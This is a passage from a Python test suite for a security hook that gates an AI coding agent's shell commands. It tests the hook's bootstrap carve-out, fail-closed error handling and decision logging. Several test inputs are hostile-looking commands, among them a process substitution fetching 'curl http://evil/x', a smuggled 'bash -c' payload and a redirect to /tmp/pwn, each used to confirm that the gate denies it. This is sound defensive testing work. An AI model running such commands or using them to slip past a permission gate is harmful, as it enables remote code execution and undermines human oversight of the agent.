        cx_check._write_auth_cache()  # must be a no-op, never raise


class TestStatePathFallback(unittest.TestCase):
    def test_state_path_none_when_no_private_dir(self):
        # When no private agent-log dir is available, _state_path returns None so callers skip
        # caching/auditing rather than touch a world-writable location (review backlog #2).
        orig = cx_check._AGENT_LOG_DIR
        cx_check._AGENT_LOG_DIR = None
        try:
            self.assertIsNone(cx_check._state_path("cx_version_cache"))
        finally:
            cx_check._AGENT_LOG_DIR = orig


@unittest.skipUnless(SH and os.name != "nt", "needs POSIX sh + symlinks (Windows → manual)")
class TestShellCarveOutIsolation(unittest.TestCase):
    """The shell launcher's bootstrap carve-out (cx_check.sh) must be NO MORE permissive than
    the Python matcher. Driven with a minimal PATH that has sh/cat/dirname but NO python and
    NO cx: with no Python, the launcher's no-Python branch denies (exit 2) for anything that
    does NOT take the carve-out — so an exit 0 can come ONLY from the carve-out, isolating its
    decision deterministically regardless of the host's real cx/auth state."""

    def _run_isolated(self, hook_input):
        bindir = tempfile.mkdtemp()
        for tool in ("sh", "cat", "dirname", "tr"):
            src = shutil.which(tool)
            if not src:
                self.skipTest("missing %s on PATH" % tool)
            os.symlink(src, os.path.join(bindir, tool))
        proc = subprocess.run(
            [os.path.join(bindir, "sh"), CX_CHECK_SH],
            input=json.dumps(hook_input).encode(),
            capture_output=True,
            timeout=30,
            env={"PATH": bindir, "PYTHONUTF8": "1"},
        )
        return proc.returncode

    def test_clean_bootstrap_takes_carveout(self):
        # Clean bootstrap (the plugin's OWN bundled path) → carve-out fires (exit 0) even with
        # no Python available.
        self.assertEqual(self._run_isolated(bash('bash "%s" install' % BOOTSTRAP)), 0)

    def test_foreign_bootstrap_path_denied(self):
        # A script merely NAMED cx-bootstrap.sh but living outside the plugin must NOT take the
        # carve-out (review F-CR2): only the bundled absolute path qualifies → deny (exit 2).
        self.assertEqual(
            self._run_isolated(bash('bash "/tmp/cx-bootstrap.sh" install')), 2)

    def test_bash_dash_c_payload_denied(self):
        # `bash -c "<payload mentioning the bundled path>"` must NOT take the carve-out (review C1:
        # the matcher must reject `bash -c …`, not just chained commands) → deny (exit 2).
        self.assertEqual(
            self._run_isolated(bash('bash -c "echo %s install"' % BOOTSTRAP)), 2)

    def test_no_mode_denied(self):
        # The carve-out requires an explicit install/upgrade mode (review C1) → a bare invocation
        # of even the bundled path is denied (exit 2).
        self.assertEqual(self._run_isolated(bash('bash "%s"' % BOOTSTRAP)), 2)

    def test_process_substitution_falls_through_to_deny(self):
        # `<(…)` must NOT take the carve-out → no Python → deny (exit 2).
        payload = bash('bash "%s" install <(curl http://evil/x)' % BOOTSTRAP)
        self.assertEqual(self._run_isolated(payload), 2)

    def test_output_redirect_falls_through_to_deny(self):
        payload = bash('bash "%s" upgrade > /tmp/pwn' % BOOTSTRAP)
        self.assertEqual(self._run_isolated(payload), 2)


class TestLoggingWiring(unittest.TestCase):
    """The gate emits redacted gate_decision events; logging must not change the decision."""

    def test_deny_emits_gate_decision(self):
        tmp = tempfile.mkdtemp()
        decision, code = run(bash("echo hi"), which=None, env={"CX_LOG_DIR": tmp})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        logfile = os.path.join(tmp, "cx-security.jsonl")
        self.assertTrue(os.path.exists(logfile))
        with open(logfile, encoding="utf-8") as fh:
            recs = [json.loads(line) for line in fh if line.strip()]
        match = [r for r in recs if r.get("event") == "gate_decision"]
        self.assertTrue(match)
        self.assertEqual(match[-1]["decision"], "deny")
        self.assertEqual(match[-1]["reason_code"], "cx_absent")
        self.assertEqual(match[-1]["tool_name"], "Bash")
        self.assertEqual(match[-1]["exit_code"], 2)

    def test_pass_emits_gate_decision(self):
        tmp = tempfile.mkdtemp()
        decision, code = run(bash("echo hi"), version_state="ok", authed=True,
                             env={"CX_LOG_DIR": tmp})
        self.assertIsNone(decision)
        with open(os.path.join(tmp, "cx-security.jsonl"), encoding="utf-8") as fh:
            recs = [json.loads(line) for line in fh if line.strip()]
        self.assertTrue(any(r.get("decision") == "pass" and r.get("reason_code") == "ok"
                            and r.get("version_state") == "ok" for r in recs))


class TestMinVersionLoader(unittest.TestCase):
    def test_loads_a_real_semver(self):
        v = cx_check._load_min_version()
        self.assertIsInstance(v, tuple)
        self.assertEqual(len(v), 3)
        self.assertTrue(all(isinstance(n, int) for n in v))

    def test_never_falls_to_zero(self):
        self.assertNotEqual(cx_check._load_min_version(), (0, 0, 0))

    def test_undecodable_file_falls_closed_not_crash(self):
        # A non-UTF-8 byte (would raise UnicodeDecodeError under any locale) must fall CLOSED to
        # the fallback, never propagate an exception that would exit 1 = fail OPEN. (LE-2 regression)
        fd, p = tempfile.mkstemp()
        try:
            with open(p, "wb") as f:
                f.write(b"\xff\xfe not utf-8 garbage\n2.3.54\n")
            self.assertEqual(cx_check._load_min_version(p), cx_check._MIN_VERSION_FALLBACK)
        finally:
            os.close(fd)
            os.remove(p)


class TestCrashGuard(unittest.TestCase):
    """main() must fail CLOSED: an unexpected exception inside cx_check() becomes a deny + exit 2,
    never an uncaught traceback (exit 1), which Claude Code would treat as a non-blocking hook
    error (fail OPEN). Real allow(0)/deny(2) SystemExit codes must pass through unchanged."""

    def test_unexpected_exception_denies_exit_2(self):
        def boom():
            raise RuntimeError("internal gate failure")
        orig = cx_check.cx_check
        cx_check.cx_check = boom
        out = io.StringIO()
        try:
            with self.assertRaises(SystemExit) as cm, redirect_stdout(out):
                cx_check.main()
        finally:
            cx_check.cx_check = orig
        self.assertEqual(cm.exception.code, 2)
        self.assertEqual(
            json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_real_exit_codes_propagate(self):
        for code in (0, 2):
            orig = cx_check.cx_check
            cx_check.cx_check = (lambda c: (lambda: sys.exit(c)))(code)
            try:
                with self.assertRaises(SystemExit) as cm:
                    cx_check.main()
            finally:
                cx_check.cx_check = orig
            self.assertEqual(cm.exception.code, code)


if __name__ == "__main__":
    unittest.main(verbosity=2)
